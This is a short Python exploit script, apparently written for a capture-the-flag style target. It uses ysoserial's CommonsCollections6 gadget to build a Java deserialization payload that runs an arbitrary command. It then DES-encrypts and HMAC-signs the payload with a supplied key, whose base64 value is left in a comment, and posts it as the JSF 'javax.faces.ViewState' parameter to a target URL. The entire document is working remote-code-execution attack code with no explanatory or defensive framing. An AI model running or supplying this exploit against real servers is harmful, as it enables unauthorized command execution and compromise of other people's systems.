#!/usr/bin/python

from base64 import b64encode,b64decode
from hashlib import sha1
from pwn import *
from requests import post, get

import hmac
import os
import pyDes
import sys

def main():
    if len(sys.argv) < 4:
        print("Java JSF exploit")
        # secret: SnNGOTg3Ni0=
        print("Usage: {} <url> <cmd> <secret>\n".format(sys.argv[0]))
        sys.exit()

    url = sys.argv[1]
    cmd = sys.argv[2]
    secret = sys.argv[3]

    log.info("Payload provided: {}".format(cmd))
    cmd = "java -jar ./ysoserial.jar CommonsCollections6 \"{}\" > payload.bin".format(cmd)
    log.info("Generating the payload with: {}".format(cmd))
    os.system(cmd)

    log.info("Payload was written to payload.bin, reading it into variable...")
    with open("payload.bin", "rb") as f:
        payload = f.read()

    log.info("Length of payload: {} bytes".format(len(payload)))

    key = b64decode(secret)
    des = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
    enc = des.encrypt(payload)
    b = hmac.new(key, bytes(enc), sha1).digest()
    payload = enc + b

    log.info("Sending encoded payload: {}".format(b64encode(payload)))
    data = {"javax.faces.ViewState": b64encode(payload)}
    r = post(url, data=data)
    log.success("Done!")

if __name__ == "__main__":
    main()
